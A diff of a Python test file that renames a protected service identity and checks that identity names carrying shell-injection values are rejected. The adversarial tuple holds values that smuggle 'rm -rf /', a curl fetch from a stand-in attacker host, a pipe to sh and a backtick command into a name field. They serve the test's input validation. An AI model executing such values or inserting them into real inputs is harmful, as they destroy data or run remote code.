@@ -134,7 +134,7 @@ def test_RUNM_001_invalid_transitions_are_rejected_through_the_public_boundary()
 
 def test_RUNM_001_adversarial_targets_are_rejected_before_any_adapter_can_act() -> None:
     adversarial = (
-        "history-coder; rm -rf /",
+        "coder-model; rm -rf /",
         "$(curl http://attacker/x.sh)",
         "name|sh",
         "a`touch pwned`",
@@ -146,7 +146,7 @@ def test_RUNM_001_adversarial_targets_are_rejected_before_any_adapter_can_act() 
         with pytest.raises(ValueError):
             InferenceIdentity(identity_id=target, mode=OwnershipMode.EXTERNAL_OBSERVED)
 
-    protected = ("ai_default", "open-webui", "history-coder")
+    protected = ("ai_default", "open-webui", "coder-model")
     policy = OwnershipPolicy(project_id="morpheus-ubuntu-1")
     for name in protected:
         identity = InferenceIdentity(identity_id=name, mode=OwnershipMode.EXTERNAL_OBSERVED)
@@ -192,18 +192,18 @@ def test_RUNM_001_adversarial_targets_are_rejected_before_any_adapter_can_act() 
 
 
 def test_RUNM_001_adoption_candidates_never_enter_ordinary_lifecycle_boundaries() -> None:
-    external = InferenceIdentity(identity_id="history-coder", mode=OwnershipMode.EXTERNAL_OBSERVED)
+    external = InferenceIdentity(identity_id="coder-model", mode=OwnershipMode.EXTERNAL_OBSERVED)
     candidate = AdoptionCandidate(
-        candidate_id="adopt-history-coder-0001",
+        candidate_id="adopt-coder-model-0001",
         external_identity=external,
         pre_state_digest=DIGEST,
-        pre_state_scope=("container:history-coder", "port:8000"),
+        pre_state_scope=("container:coder-model", "port:8000"),
         proposed_target=ManagedTarget(
             identity_id="morpheus-libri-gguf-1",
             deployment_plan_id="plan-libri-gguf-q4-0001",
             owned_root="/mnt/data/morpheus/models",
         ),
-        confirmation="adopt history-coder",
+        confirmation="adopt coder-model",
         recovery_plan_id="recovery-cleanup-0001",
     )
 
